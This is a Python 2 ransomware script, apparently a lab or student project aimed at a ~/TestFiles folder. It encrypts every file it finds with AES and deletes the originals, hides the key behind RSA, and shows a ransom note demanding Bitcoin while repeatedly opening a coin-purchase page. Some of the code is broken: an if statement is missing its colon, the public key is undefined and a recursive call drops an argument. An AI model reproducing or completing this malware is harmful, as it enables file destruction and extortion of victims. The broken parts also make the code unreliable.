import Crypto, ast, os, sys, glob, socket, base64, hashlib, Tkinter, webbrowser, time, random, io, base64
from Crypto.PublicKey import RSA
from Crypto.Cipher import AES
from Tkinter import *
from Crypto import Random
from os.path import expanduser
from urllib2 import urlopen


#significant help on getting AES encryption to work from
#https://github.com/the-javapocalypse/Python-File-Encryptor/blob/master/script.py

def pad(s):
    return s + b"\0" * (AES.block_size - len(s) % AES.block_size)

def encrypt(message, key, key_size=256):
    message = pad(message)
    iv = Random.new().read(AES.block_size)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return iv + cipher.encrypt(message)

def encrypt_file(key, file_name):
    with open(file_name, 'rb') as fo:
        plaintext = fo.read()
    enc = encrypt(plaintext, key)
    with open(file_name + ".enc", 'wb') as fo:
        fo.write(str(enc))
    os.remove(file_name)

def decrypt(ciphertext, key):
        iv = ciphertext[:AES.block_size]
        cipher = AES.new(key, AES.MODE_CBC, iv)
        plaintext = cipher.decrypt(ciphertext[AES.block_size:])
        return plaintext.rstrip(b"\0")

def decrypt_file(key, file_name):
    with open(file_name, 'rb') as fo:
        ciphertext = fo.read()
    dec = decrypt(ciphertext, key)
    with open(file_name[:-4], 'wb') as fo:
        fo.write(dec)
    os.remove(file_name)

#traversing the file system to encrypt files
def traverse_files(nwd, aes_key, depth):
    # get list of files and directories in current directory
    search_dir = nwd + "/*"
    files = glob.glob(search_dir)
    # want to make sure there are files to encrypt or directories to search
    while files:
        for path in files:
            req1 = 'Home' in os.path.basename(os.path.normpath(path))
            req2 = 'home' in os.path.basename(os.path.normpath(path))
            req3 = 'INFO' in os.path.basename(os.path.normpath(path))

            if not os.path.isdir(path):
                encrypt_file(aes_key, path)
                #print((depth*'  ') + "|F: " + os.path.basename(os.path.normpath(path)))

            elif os.path.isdir(path) and not req2 and not req2 and not req3:
                traverse_files(path, aes_key, depth + 1)
                #print("|" + (depth*'- ') + "D: " + os.path.basename(os.path.normpath(path)))
        files = []

def display_note(directory, loop):

    note = """ Q: What has happened to my computer?

    All of your files have been encrypted. Your decyption key is in the 'RANSOM_INFO'
    folder on your desktop. We suggest you don't tamper with it.


Q: Can I recover my files?

    Yes you can. Just send $100 of Bitcoin to this Bitcoin address:

                  1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa

    Bitcoins can be purchased from Coinbase at the URL:

                  https://www.coinbase.com/buy-bitcoin

    Then, send an email to the email address you received this file from and we
    will send you the decryption program.
    """

    f = open (os.path.join(directory, "RANSOM_NOTE.txt"), 'w')
    f.write(note) #write ciphertext to file
    f.close()
    
    if(loop == 0) webbrowser.open('https://www.coinbase.com/buy-bitcoin')

    master = Tk()
    master.title('RANSOMWARE ATTACK')
    msg = Message(master, text = note)
    msg.config(bg='red', font=('times', 24, 'italic'))
    msg.pack()
    mainloop()
    webbrowser.open('https://www.coinbase.com/buy-bitcoin')
    display_note(directory)

def main():
    #### PUBLIC ENCRYPTION KEY WILL BE ADDED HERE ####


    rsa_key = RSA.importKey(public_key)
    pub_key = rsa_key.publickey()

    #generate a random AES key, pass it to the traverse function which will
    #use it for encrypting individual files
    #represented in bytes 16 bytes = 128 bits
    aes_key = os.urandom(32)

    #start from the home directory, pass it to the traverse function
    home = os.environ['HOME']
    cwd = os.path.join(home, 'TestFiles')
    print(cwd + "\n")
    traverse_files(cwd, aes_key, 0)

    encrypted_key = pub_key.encrypt(aes_key, 32)

    info_dir = os.path.join(home, 'Desktop', 'RANSOM_INFO')
    if not os.path.exists(info_dir):
        os.makedirs(info_dir)

    f = open (os.path.join(info_dir, 'encryptedKey.txt'), 'w')
    f.write(str(encrypted_key)) #write ciphertext to file
    f.close()

    display_note(info_dir, 0)

if __name__ == "__main__":
    main()
